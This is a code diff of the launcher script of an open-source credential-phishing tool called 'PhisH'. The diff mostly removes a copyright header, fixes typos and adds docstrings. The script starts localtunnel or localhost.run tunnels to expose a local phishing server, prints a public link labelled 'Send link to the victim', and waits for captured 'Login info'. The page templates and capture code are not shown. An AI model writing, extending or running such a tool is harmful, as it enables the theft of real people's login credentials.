@@ -1,21 +1,12 @@
-# ============================================================================
-# PhisH - Automated Phishing Tool
-# Copyright © 2026 Humayun Shariar Himu. All rights reserved.
-# ============================================================================
-# This file and all contents are the intellectual property of 
-# Humayun Shariar Himu. Unauthorized reproduction or distribution is prohibited.
-# ============================================================================
-
 import os
 from multiprocessing import Process
 from src.some_func import *
 import time
+
 try:
     from src.setup_ver import *
 except Exception:
-    print("no dipendencies found, go on https://github.com/HumayunShariarHimu/PhisH-Clean and copy-paste in termianl setup command for your system")
-
-
+    print("no dipendencies found, go on https://github.com/HumayunShariarHimu/PhisH and copy-paste in terminal setup command for your system")
 
 class bcolors:
     HEADER    = '\033[95m'
@@ -29,9 +20,7 @@ class bcolors:
     GREY      = '\033[90m'
     BG_RED    = '\033[41m'
 
-
-
-
+# Main execution
 clear()
 banner()
 print(choice)
@@ -50,9 +39,10 @@ if scelta2 == "1":
     print(bcolors.OKBLUE+'''
 '''+square_tild+bcolors.WARNING+''' Waiting for Login info, '''+bcolors.OKBLUE+"Ctrl + C to exit."+bcolors.ENDC+'''
 
-     ''')
+    ''')
 elif scelta2 == "2":
     def script1():
+        """Run localtunnel"""
         os.system("python3 lt.py")
         
     if __name__ == '__main__':
@@ -61,23 +51,23 @@ elif scelta2 == "2":
     time.sleep(1.5)
     file = open("url.txt", "r")
     time.sleep(1.5)
-    #read the content of file
     url = file.read()
     print(bcolors.OKBLUE+'''
 '''+square_tild+bcolors.OKBLUE+''' Local url :'''+bcolors.WARNING+''' http://localhost:8080'''+bcolors.OKBLUE+'''
 '''+square_tild+bcolors.OKBLUE+''' Send link to the victim :'''+bcolors.WARNING+url[12:100]+bcolors.ENDC+'''
 '''+square_tild+bcolors.WARNING+''' Waiting for Login info, '''+bcolors.OKBLUE+"Ctrl + C to exit."+bcolors.ENDC+'''
 
-     ''')
+    ''')
 elif scelta2 == "3":
     def script2():
+        """Run localhost.run"""
         os.system("python3 lh.py")
         
     if __name__ == '__main__':
         p = Process(target=script2)
         p.start()
     print('''\n\n'''+
-square_tild+bcolors.OKBLUE+''' Local url :'''+bcolors.WARNING+''' http://localhost:8080'''+bcolors.OKGREEN)          
+    square_tild+bcolors.OKBLUE+''' Local url :'''+bcolors.WARNING+''' http://localhost:8080'''+bcolors.OKGREEN)          
     time.sleep(3)
     print(bcolors.ENDC)
     print(bcolors.OKBLUE+'''                                 Send link to the victim ↑''')
